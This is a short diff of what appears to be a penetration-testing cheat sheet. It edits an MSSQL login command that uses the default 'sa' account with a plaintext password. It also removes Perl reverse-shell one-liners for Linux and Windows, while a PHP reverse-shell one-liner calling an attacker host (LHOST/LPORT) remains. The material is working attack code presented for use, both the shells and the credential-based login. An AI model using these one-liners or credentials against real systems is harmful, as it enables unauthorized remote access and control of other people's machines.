@@ -140,7 +140,7 @@ db_password
 
 # Windows:
 Mssql (port 1433), common username = sa
-sqsh -S 10.11.1.31 -U sa -P poiuytrewq
+sqsh -S 10.11.1.1 -U sa -P poiuytrewq
 SELECT @@version
 SELECT user_name()
 SELECT name FROM master..syslogins
@@ -334,11 +334,6 @@ Javascript:
 
 php:
 php -r '$sock=fsockopen("LHOST",LPORT);system("/bin/sh -i <&3 >&3 2>&3");'
-
-Perl Linux:
-perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-Perl windows:
-perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 Windows
 ```
